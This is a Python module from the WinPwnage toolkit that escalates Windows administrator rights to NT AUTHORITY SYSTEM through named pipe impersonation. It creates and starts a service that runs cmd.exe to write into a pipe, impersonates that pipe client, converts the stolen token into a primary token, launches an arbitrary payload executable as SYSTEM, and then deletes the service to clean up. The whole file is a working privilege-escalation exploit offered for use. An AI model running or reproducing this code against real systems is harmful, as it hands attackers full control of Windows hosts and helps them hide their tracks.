from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import os

#Creds to: https://gist.github.com/highsenburger69/09b816daa16f020d188c289fd401b0b2

namedpipeimpersonation_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using named pipe impersonation",
	"Id": "3",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "named_pipe_impersonation",
	"Function Payload": True,
}


def Service(lol):
    global ServiceName
    ServiceName = u"WinPwnage"
    payload = r"%COMSPEC% /c ping -n 1 127.0.0.1 >nul && echo 'WinPwnage' > \\.\pipe\WinPwnagePipe"

    print_info("Connecting to the local service control management database")
    serviceDBHandle = OpenSCManager(r"\\localhost", "ServicesActive", 0x0001 | 0x0002)
    if not serviceDBHandle:
        print_error("Error while connecting to the local service database using OpenSCManager: {}".format(GetLastError()))

    schService = CreateService(serviceDBHandle, ServiceName, None,
								0x00020000 | 0x00040000 | 0x0010, 0x00000010,
								0x00000003, 0x00000000, payload, None, None, None, None, None)
    if not schService:
        print_error("Error while creating our service using CreateService: {}".format(GetLastError()))
    print_info("Created service: {}".format(ServiceName))
	
    print_info("Starting our service")
    serviceHandle = OpenService(serviceDBHandle, ServiceName, 0x0010) 
    StartService(serviceHandle, 0, None)
    print_success("Started service:".format(ServiceName))
    CloseServiceHandle(serviceDBHandle)
    CloseServiceHandle(schService)

def Deleteservice():
    print_info("Performing cleanup")
    serviceDBHandle = OpenSCManager(r'\\localhost', "ServicesActive", 0x0001)
    serviceHandle = OpenService(serviceDBHandle, ServiceName, 0x00010000)
    DeleteService(serviceHandle)
    print_success("Deleted service: {}".format(ServiceName))
    CloseServiceHandle(serviceDBHandle)

def named_pipe_impersonation(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		hPipe = CreateNamedPipe(r"\\.\pipe\WinPwnagePipe", 0x00000003, 0x00000000 | 0x00000000, 255 ,0 , 0, 0, None)
		if not hPipe:
			print_error("Error while creating our named pipe using CreateNamedPipe: {}".format(GetLastError()))
		else:
			print_success("Creating our Named Pipe")

		CALLBACK = CFUNCTYPE(None, POINTER(c_int))
		RunService = CALLBACK(Service)
		print_info("Running service function in another thread, waiting for cmd.exe to send data to pipe")
		cThread = CreateThread(None, 0, RunService, None, 0, None)
		if not cThread:
			print_error("Error while Creating thread in the virtual space of the current process to mimick a client/server interaction like a multi-thread named pipe server using CreateThread: {}".format(GetLastError()))
		CloseHandle(cThread)

		if not ConnectNamedPipe(hPipe, None):
			print_error("Error while waiting the client to trigger a connection in the Named Pipe using ConnectNamedPipe: {}".format(GetLastError()))
		else:
			print_success("Connected to Named Pipe")

		ReadFile(hPipe, 0, 0, None, None)
		print_info("Receiving payload")
		
		if not ImpersonateNamedPipeClient(hPipe):
			print_error("Error while impersonating the access token at the end of the pipe using ImpersonateNamedPipeClient: {}".format(GetLastError()))
		else:
			print_info("Impersonating the client's security context")

		hToken = HANDLE(c_void_p(-1).value)
		if not OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, False, byref(hToken)):
			print_error("Error while opening our thread's token using OpenThreadToken: {}".format(GetLastError()))
		else:
			print_info("Opening our current process's thread token")

		hPrimaryToken = HANDLE(c_void_p(-1).value)
		if not DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, byref(hPrimaryToken)):			
			if not DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,byref(hPrimaryToken)):
				print_error("Error while trying to convert the impersonation token into a primary token using DuplicateTokenEx: {}".format(GetLastError()))

		print_info("Converting impersonation token into a primary token")

		lpStartupInfo = STARTUPINFO()
		lpStartupInfo.cb = sizeof(lpStartupInfo)
		lpProcessInformation = PROCESS_INFORMATION()
		lpStartupInfo.dwFlags = 0x00000001
		lpStartupInfo.wShowWindow = 5
		lpApplicationName = payload
		if not advapi32.CreateProcessAsUserA(hPrimaryToken, None, lpApplicationName, None, None, False, 0, None, None, byref(lpStartupInfo), byref(lpProcessInformation)):
			if CreateProcessWithToken(hPrimaryToken, 0x00000002, lpApplicationName,
													None, 0x00000010, None, None, byref(lpStartupInfo),
													byref(lpProcessInformation)) == 0:
				print_error("Error while triggering payload using CreateProcessWithToken: {}".format(GetLastError()))
			else:				
				print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))
			
		Deleteservice()
	else:
		print_error("Cannot proceed, invalid payload")
		return False		
